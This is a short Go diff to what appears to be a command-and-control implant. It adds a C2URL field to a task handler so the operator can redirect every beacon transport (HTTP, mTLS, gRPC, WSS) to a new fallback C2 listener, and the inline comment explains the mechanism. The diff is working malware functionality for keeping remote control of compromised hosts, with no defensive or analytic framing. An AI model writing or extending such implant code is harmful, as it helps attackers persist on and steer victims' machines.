@@ -17,6 +17,7 @@ type ProfileRotation struct {
 	BeaconMethod string `json:"beacon_method"`
 	UserAgent    string `json:"user_agent"`
 	Encoding     string `json:"encoding"` // "json", "msgpack", "cbor"
+	C2URL        string `json:"c2_url"`
 }
 
 var profileOverrides struct {
@@ -25,6 +26,7 @@ var profileOverrides struct {
 	beaconMethod string
 	userAgent    string
 	encoding     string
+	c2URL        string
 }
 
 func handleProfileRotate(task Task, res *TaskResult) {
@@ -53,6 +55,14 @@ func handleProfileRotate(task Task, res *TaskResult) {
 		case "json", "msgpack", "cbor":
 			profileOverrides.encoding = pr.Encoding
 		}
+	}
+	if pr.C2URL != "" {
+		// Redirect all transports to the new C2 endpoint. sendToC2 builds the
+		// final URL as C2URLs[idx] + beaconURI, so replacing the list moves
+		// every transport (HTTP/mTLS/gRPC/WSS/...) to the fallback listener.
+		profileOverrides.c2URL = pr.C2URL
+		C2URLs = []string{pr.C2URL}
+		currentC2Idx = 0
 	}
 	res.Output = "profile rotated"
 }
